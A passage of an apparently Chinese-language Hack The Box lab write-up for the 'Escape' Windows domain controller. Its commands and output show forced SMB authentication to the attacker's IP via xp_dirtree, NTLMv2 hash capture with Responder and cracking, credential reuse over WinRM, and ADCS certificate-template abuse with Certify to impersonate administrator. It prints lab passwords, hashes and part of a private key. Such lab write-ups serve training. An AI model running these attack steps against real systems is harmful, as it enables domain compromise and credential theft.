---
title: WrHTB-Escape Writeup
date: 2026-08-24T14:00:00+08:00
draft: false
toc: true
images:
tags:
  - Hack
  - Writeup
  - HTB
  - SMB
  - LDAP
  - Certify
---
## Nmap 探测

使用 Nmap 扫描存活的端口。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Escape]
└─$ sudo nmap --min-rate 10000 -p- 10.129.228.253 -oA Nmap/ports
Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-21 02:04 -0400
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
Nmap scan report for 10.129.228.253
Host is up (3.8s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
1433/tcp  open  ms-sql-s
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49681/tcp open  unknown
49682/tcp open  unknown
49702/tcp open  unknown
49712/tcp open  unknown
49733/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 47.13 seconds
```

提取端口做备用。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Escape]
└─$ grep open Nmap/ports.nmap | awk -F '/' '{print $1}' | paste -sd ','
53,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,49667,49681,49682,49702,49712,49733
```

对存活的端口执行详细信息扫描。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Escape]
└─$ sudo nmap -sT -sC -sV -O -p53,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,49667,49681,49682,49702,49712,49733 10.129.228.253 -oA Nmap/detail_scan
[sudo] password for kali: 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-21 02:10 -0400
Nmap scan report for 10.129.228.253
Host is up (0.11s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-21 14:09:50Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-08-21T14:11:26+00:00; +7h59m25s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-08-21T14:11:25+00:00; +7h59m24s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   10.129.228.253:1433: 
|     Target_Name: sequel
|     NetBIOS_Domain_Name: sequel
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: dc.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
| ms-sql-info: 
|   10.129.228.253:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2026-08-21T14:11:26+00:00; +7h59m25s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-08-21T13:49:13
|_Not valid after:  2056-08-21T13:49:13
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
|_ssl-date: 2026-08-21T14:11:26+00:00; +7h59m25s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
|_ssl-date: 2026-08-21T14:11:26+00:00; +7h59m25s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49681/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49682/tcp open  msrpc         Microsoft Windows RPC
49702/tcp open  msrpc         Microsoft Windows RPC
49712/tcp open  msrpc         Microsoft Windows RPC
49733/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h59m24s, deviation: 0s, median: 7h59m24s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-08-21T14:10:47
|_  start_date: N/A

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 106.63 seconds
                                                             
```

开放了 ldap、winrm、smb 服务，整体测绘像是 windows 的机器。

将暴露出来的域名解析至 hosts 文件。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Escape]
└─$ sudo bash -c 'echo "10.129.228.253 sequel.htb" >> /etc/hosts'
                                                                                                                                                                                    
┌──(kali㉿kali)-[~/Work/Kali/Escape]
└─$ tail -n1 /etc/hosts
10.129.228.253 sequel.htb

```

## SMB 探索

使用随机用户查看 smb 共享文件，有一个非默认共享文件 Public。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Escape]
└─$ nxc smb sequel.htb -u 'enil' -p '' --shares
SMB         10.129.228.253  445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.228.253  445    DC               [+] sequel.htb\enil: (Guest)
SMB         10.129.228.253  445    DC               [*] Enumerated shares
SMB         10.129.228.253  445    DC               Share           Permissions     Remark
SMB         10.129.228.253  445    DC               -----           -----------     ------
SMB         10.129.228.253  445    DC               ADMIN$                          Remote Admin
SMB         10.129.228.253  445    DC               C$                              Default share
SMB         10.129.228.253  445    DC               IPC$            READ            Remote IPC
SMB         10.129.228.253  445    DC               NETLOGON                        Logon server share 
SMB         10.129.228.253  445    DC               Public          READ            
SMB         10.129.228.253  445    DC               SYSVOL                          Logon server share 
```

连接 Public，将里面的文件全部下载下来。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Escape/Smb]
└─$ smbclient //10.129.228.253/Public -U enil -N -W sequeal.htb
Try "help" to get a list of possible commands.
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
getting file \SQL Server Procedures.pdf of size 49551 as SQL Server Procedures.pdf (71.6 KiloBytes/sec) (average 71.6 KiloBytes/sec)

```

下载下来了一个 PDF。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Escape/Smb]
└─$ file SQL\ Server\ Procedures.pdf 
SQL Server Procedures.pdf: PDF document, version 1.4, 2 page(s)

```

打开 PDF，暴露了一个人名。

![](Pasted%20image%2020260821145048.png)

将人名保存下来备用。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Escape/Users]
└─$ vim users.txt
                                                                                                                                                                                    
┌──(kali㉿kali)-[~/Work/Kali/Escape/Users]
└─$ cat users.txt 
Brandon

```

继续查看 PDF，发现暴露了一个 mssql 用户凭据。

![](Pasted%20image%2020260821145200.png)

将这个用户保存下来备用。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Escape/Users]
└─$ vim PublicUser
                                                                                                                                                                                    
┌──(kali㉿kali)-[~/Work/Kali/Escape/Users]
└─$ cat PublicUser 
PublicUser:GuestUserCantWrite1

```

## MSSQL 探索

用 PublicUser 连接 mssql，发现这个用户不是 sysadmin，向本地发送 smb 访问请求。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Escape/Users]
└─$ mssqlclient.py PublicUser:GuestUserCantWrite1@10.129.228.253
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 


[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLMOCK): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
[!] Press help for extra shell commands
SQL (PublicUser  guest@master)> SELECT IS_SRVROLEMEMBER('sysadmin')
    
-   
0   
SQL (PublicUser  guest@master)> EXEC master..xp_dirtree '\\10.10.16.151\share'

```

启动 responder，接住 mssql 向外发出的 smb 包，得到 sql_svc 的 hash。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Escape]
└─$ sudo responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|


[*] Tips jar:
    USDT -> 0xCc98c1D3b8cd9b717b5257827102940e4E17A19A
    BTC  -> bc1q9360jedhhmps5vpl3u05vyg4jryrl52dmazz49

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]
    DHCPv6                     [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.16.151]
    Responder IPv6             [fe80::f7a5:fcd7:2fa2:2299]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-ERECPSN4CT2]
    Responder Domain Name      [FUQ6.LOCAL]
    Responder DCE-RPC Port     [47508]

[*] Version: Responder 3.2.2.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.129.228.253
[SMB] NTLMv2-SSP Username : sequel\sql_svc
[SMB] NTLMv2-SSP Hash     : sql_svc::sequel:1961f44c4add5329:5EAFAB3FEB53FB08B806BEF99AE41B9F:0101000000000000801125561F31DD01EB2F04EDCAAB1B870000000002000800460055005100360001001E00570049004E002D004500520045004300500053004E00340043005400320004003400570049004E002D004500520045004300500053004E0034004300540032002E0046005500510036002E004C004F00430041004C000300140046005500510036002E004C004F00430041004C000500140046005500510036002E004C004F00430041004C0007000800801125561F31DD0106000400020000000800300030000000000000000000000000300000EDC8DB1FDD40130E0545591C518033A46AA0EA4F594CC08E86049F32AFE7E3190A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310036002E003100350031000000000000000000
[+] Exiting...
```

将 hash 保存下来。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Escape/Users]
└─$ vim sql_svc.hash
                                                                                                                                                                                    
┌──(kali㉿kali)-[~/Work/Kali/Escape/Users]
└─$ cat sql_svc.hash 
sql_svc::sequel:1961f44c4add5329:5EAFAB3FEB53FB08B806BEF99AE41B9F:0101000000000000801125561F31DD01EB2F04EDCAAB1B870000000002000800460055005100360001001E00570049004E002D004500520045004300500053004E00340043005400320004003400570049004E002D004500520045004300500053004E0034004300540032002E0046005500510036002E004C004F00430041004C000300140046005500510036002E004C004F00430041004C000500140046005500510036002E004C004F00430041004C0007000800801125561F31DD0106000400020000000800300030000000000000000000000000300000EDC8DB1FDD40130E0545591C518033A46AA0EA4F594CC08E86049F32AFE7E3190A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310036002E003100350031000000000000000000
```

使用 hashcat 破解 hash 得到 sql_svc 的密码。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Escape/Users]
└─$ hashcat -m 5600 sql_svc.hash /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-13th Gen Intel(R) Core(TM) i9-13900HX, 13929/27859 MB (4096 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 514 MB (27484 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

SQL_SVC::sequel:1961f44c4add5329:5eafab3feb53fb08b806bef99ae41b9f:0101000000000000801125561f31dd01eb2f04edcaab1b870000000002000800460055005100360001001e00570049004e002d004500520045004300500053004e00340043005400320004003400570049004e002d004500520045004300500053004e0034004300540032002e0046005500510036002e004c004f00430041004c000300140046005500510036002e004c004f00430041004c000500140046005500510036002e004c004f00430041004c0007000800801125561f31dd0106000400020000000800300030000000000000000000000000300000edc8db1fdd40130e0545591c518033a46aa0ea4f594cc08e86049f32afe7e3190a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310036002e003100350031000000000000000000:REGGIE1234ronnie

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: SQL_SVC::sequel:1961f44c4add5329:5eafab3feb53fb08b8...000000
Time.Started.....: Fri Aug 21 03:53:43 2026 (3 secs)
Time.Estimated...: Fri Aug 21 03:53:46 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  3345.5 kH/s (1.34ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10706944/14344385 (74.64%)
Rejected.........: 0/10706944 (0.00%)
Restore.Point....: 10698752/14344385 (74.58%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: REPIN210 -> RAHRYA
Hardware.Mon.#01.: Util: 47%

Started: Fri Aug 21 03:53:32 2026
Stopped: Fri Aug 21 03:53:47 2026
```

保存下来。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Escape/Users]
└─$ vim sql_svc     

┌──(kali㉿kali)-[~/Work/Kali/Escape/Users]
└─$ cat sql_svc     
sql_svc:REGGIE1234ronnie

```

检测一下 sql_svc 的权限，有 winrm 权限。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Escape]
└─$ nxc winrm sequel.htb -u sql_svc -p 'REGGIE1234ronnie'
WINRM       10.129.228.253  5985   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.228.253  5985   DC               [+] sequel.htb\sql_svc:REGGIE1234ronnie (Pwn3d!)
```

## 提权至 ryan.cooper

登录 sql_svc。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Escape]
└─$ evil-winrm -i sequel.htb -u sql_svc -p 'REGGIE1234ronnie'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\sql_svc\Documents> whoami
sequel\sql_svc

```

查看根目录发现有一个 SQLServer 文件。

```bash
*Evil-WinRM* PS C:\> dir


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         2/1/2023   8:15 PM                PerfLogs
d-r---         2/6/2023  12:08 PM                Program Files
d-----       11/19/2022   3:51 AM                Program Files (x86)
d-----       11/19/2022   3:51 AM                Public
d-----         2/1/2023   1:02 PM                SQLServer
d-r---         2/1/2023   1:55 PM                Users
d-----         2/6/2023   7:21 AM                Windows
```

枚举 SQLServer 文件。

```bash
*Evil-WinRM* PS C:\SQLServer> dir


    Directory: C:\SQLServer


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         2/7/2023   8:06 AM                Logs
d-----       11/18/2022   1:37 PM                SQLEXPR_2019
-a----       11/18/2022   1:35 PM        6379936 sqlexpress.exe
-a----       11/18/2022   1:36 PM      268090448 SQLEXPR_x64_ENU.exe

```

```bash
*Evil-WinRM* PS C:\SQLServer\Logs> dir                                                                                                                                              
                                                                                                                                                                                    
                                                                                                                                                                                    
    Directory: C:\SQLServer\Logs                                                                                                                                                    
                                                                                                                                                                                    
                                                                                                                                                                                    
Mode                LastWriteTime         Length Name                                                                                                                               
----                -------------         ------ ----                                                                                                                               
-a----         2/7/2023   8:06 AM          27608 ERRORLOG.BAK                                                                                                                       
                                                                                                                                                                                    
                                                                                                                                                                                    
*Evil-WinRM* PS C:\SQLServer\Logs> type ERRORLOG.BAK
...
...
2022-11-18 13:43:07.44 Logon Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1] 2022-11-18 13:43:07.48 Logon Error: 18456, Severity: 14, State: 8. 2022-11-18 13:43:07.48 Logon Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
...
...
```

ERRORLOG.BAK 中存放了 ryan.cooper 的密码，检测一下权限，发现有 winrm 权限。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Escape]
└─$ nxc winrm sequel.htb -u ryan.cooper -p NuclearMosquito3
WINRM       10.129.228.253  5985   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.228.253  5985   DC               [+] sequel.htb\ryan.cooper:NuclearMosquito3 (Pwn3d!)
```

登录拿到 user flag。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Escape]
└─$ evil-winrm -i sequel.htb -u ryan.cooper -p NuclearMosquito3
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> type ..\Desktop\user.txt
3bce098970ee93facb8138808954f053
```

## 提权至 administrator

查看 adcs 的配置。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Escape]
└─$ nxc ldap sequel.htb -u ryan.cooper -p NuclearMosquito3 -M adcs
LDAP        10.129.228.253  389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb) (signing:Enforced) (channel binding:Never) 
LDAP        10.129.228.253  389    DC               [+] sequel.htb\ryan.cooper:NuclearMosquito3 
ADCS        10.129.228.253  389    DC               [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
ADCS        10.129.228.253  389    DC               Found PKI Enrollment Server: dc.sequel.htb
ADCS        10.129.228.253  389    DC               Found CN: sequel-DC-CA

```

上传 certify，查看当前用户可利用的信息。

```bash
*Evil-WinRM* PS C:\programdata\apps> .\Certify.exe find /vulnerable /currentuser                                                                                                    
                                                                                                                                                                                    
   _____          _   _  __                                                                                                                                                         
  / ____|        | | (_)/ _|                                                                                                                                                        
 | |     ___ _ __| |_ _| |_ _   _                                                                                                                                                   
 | |    / _ \ '__| __| |  _| | | |                                                               
 | |___|  __/ |  | |_| | | | |_| |                                                        
  \_____\___|_|   \__|_|_|  \__, |              
                             __/ |                  
                            |___./                             
  v1.0.0                                                                                                                      
                                                                                                                              
[*] Action: Find certificate templates                                                                                        
[*] Using current user's unrolled group SIDs for vulnerability checks.                                                        
[*] Using the search base 'CN=Configuration,DC=sequel,DC=htb'
                                                                      
[*] Listing info about the Enterprise CA 'sequel-DC-CA'             
                                                                               
    Enterprise CA Name            : sequel-DC-CA                               
    DNS Hostname                  : dc.sequel.htb      
    FullName                      : dc.sequel.htb\sequel-DC-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=sequel-DC-CA, DC=sequel, DC=htb
    Cert Thumbprint               : A263EA89CAFE503BB33513E359747FD262F91A56                                                                                                        
    Cert Serial                   : 1EF2FA9A7E6EADAD4F5382F4CE283101                                                                                                                
    Cert Start Date               : 11/18/2022 12:58:46 PM                                                                                                                          
    Cert End Date                 : 11/18/2121 1:08:46 PM                                                                                                                           
    Cert Chain                    : CN=sequel-DC-CA,DC=sequel,DC=htb                      
    UserSpecifiedSAN              : Disabled                                              
    CA Permissions                :                                                       
      Owner: BUILTIN\Administrators        S-1-5-32-544
                                                                                          
      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
      Allow  ManageCA, ManageCertificates               sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
    Enrollment Agent Restrictions : None                                                  

[!] Vulnerable Certificates Templates :                                                   

    CA Name                               : dc.sequel.htb\sequel-DC-CA
    Template Name                         : UserAuthentication
    Schema Version                        : 2
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions                                                                           
      Enrollment Permissions                                                              
        Enrollment Rights           : sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Domain Users           S-1-5-21-4078382237-1492182817-2568127209-513
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
      Object Control Permissions                                                          
        Owner                       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
        WriteOwner Principals       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
        WriteDacl Principals        : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
        WriteProperty Principals    : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519



Certify completed in 00:00:09.7932040 
```

向 CA 申请一个 administrator 的证书。

```bash
*Evil-WinRM* PS C:\programdata\apps> .\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:administrator

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.0.0

[*] Action: Request a Certificates

[*] Current user context    : sequel\Ryan.Cooper
[*] No subject name specified, using current context as subject.

[*] Template                : UserAuthentication
[*] Subject                 : CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
[*] AltName                 : administrator

[*] Certificate Authority   : dc.sequel.htb\sequel-DC-CA

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 13

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA1VRWMwST7K+lIuyrHPPcEg7q9eAgmFhPI+HPXFHR2+fqRIf3
Rv8RCeQ8uZahSBemCYha/29mkCcoP1UesUnaG0G8TUpijXHBVMlFit1ZqgcEyrUE
EiN4En4rieoTOVT7M2O3/azm3M7jVk9w5w1QQaOoV36cU1UetG6V3cLPYsZ6HOpy
eFmMWT5Bdi7p8LCLlg+ws7dV4I1Geb9IFecD1g+WumihUqTrg0/6QgMh3Ap/mj1B
RvjSx835+CwBkmI9azCdHAQ/3HxRUspJQ9jVCk23ZYObYKvC1iI9MvWonqkmpFBW
PtOkvsxnGCGxcFJbkr/uHmlBy3Whjq10q9xNsQIDAQABAoIBAHqSHYDstW19sh0x
7FMTTjPV/GxPXYsK2lXcjX8Wx8RZKQI9OPfC3/BWAgoEISDB7bV2cgpn4H8c8IQL
DTqCG14j0+R4w81POezURC+4ZKdLpxYtEWy2kmvVsIBqTKdZS4fIWNPZP0BJYteZ
h15KCP3d4YB8D6fVtXGoRFWJdAzkvnccbYyRumFrLWNpYr7re2E/7CpHoaRoRWCr
n81a2ZtYBSaN0aTIiHRtXug2Vu0luqiTrow2ga24kpejRWIhx1bYSXuMeJVhzZgS
+Cg7823+qMEkFijUDnkC07ilyPuEsMy4t0hakZweHip5w/szIaefQqjffjCZEKQK
OsJC/W0CgYEA7htvEZnVN9ewwuD+iwwqbFajD9bCalu/fA0a7DbfXXSeI+80O0zp
js9dIyieArKap6DzYhtEXYc74ONkS6ADylWenFcbFHo8O8Uhf0aelcFqTt20Wb/T
PxTEmYfblrFV1swKvQPeg/2yimLtHyRaue0Z6CBVwj4rM6XE66NIAtsCgYEA5Vw+
V9q1NJC+ZByooSLFIQ7YtYsAWxAEySkGAqBnYzkcHAUPiQ0iYs7tLnoqA5jf4Oev
THjT1Yns7nWj5U9DcUPKHbtw08BThX4ZsrImdXg7oNLxDomkCpIIOVXn0wgNhb9y
YXRTKL6nx8AohzHmnZjHiBiCCSQDYfiGiQs0iWMCgYB96FXYKc9cwxp+Qnl3T4yT
U1DQjFCr6y4bS9bDt9RvV75T5CZrgSUz1iU69Txw0r8DCxIH+8Ev79XS+otLjibS
9Gl15H22W1jEhl5LLi2npOoxH/1BRDVRcwru4K9WRRnOBoFbJ9OfWiTyFpOq1w9+
p4j+fTK8DyHLIso5jFME5wKBgQDfsqL/bslTNmTrIWR6nH3laySDk8nKBwqT49X/
09BiXv4CehEX216RPj7oGLBHh9+67Fz12dbJq1cRkF1EtpURsEs9ymYVsLwFM+L+
